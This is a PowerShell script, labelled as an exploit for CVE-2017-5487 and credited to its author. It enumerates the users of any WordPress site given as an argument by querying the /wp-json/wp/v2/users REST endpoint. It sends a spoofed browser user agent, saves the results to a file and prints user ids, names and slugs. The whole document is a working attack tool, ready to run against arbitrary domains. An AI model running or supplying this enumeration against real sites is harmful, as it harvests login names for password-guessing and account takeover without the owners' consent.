$Target = $args[0]
$pwd = Get-Location
(Invoke-WebRequest -Uri "https://$Target/wp-json/wp/v2/users" -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" -Method Get).Content | Out-File $Target-Org-WordPress-Users.json utf8 -Force
Write-Host "`nExploit - WordPress User Enumeration via REST - /wp/v2/users" -ForegroundColor Red
Write-Host "`nDomain Overview: $Target" -ForegroundColor Red
Get-Content $pwd\$Target-org-WordPress-users.json -Encoding UTF8 | ConvertFrom-Json | Sort-Object name,id | Format-Table -Property id,name,slug,meta,link -Wrap -AutoSize
Write-Host "Results saved to:"$pwd"\"$Target"-org-WordPress-users.json`n" -ForegroundColor Red
Write-Host "Reference: CVE-2017-5487`nTenable Plugin: https://www.tenable.com/cve/CVE-2017-5487`nCVEDetails: https://www.cvedetails.com/cve/CVE-2017-5487`nWordfence: https://www.wordfence.com/blog/2016/12/wordfence-blocks-username-harvesting-via-new-rest-api-wp-4-7/`n`nWritten by Gabriel H. @weekndr_sec`nhttps://github.com/ndr-repo | http://weekndr.me`n" -ForegroundColor Red
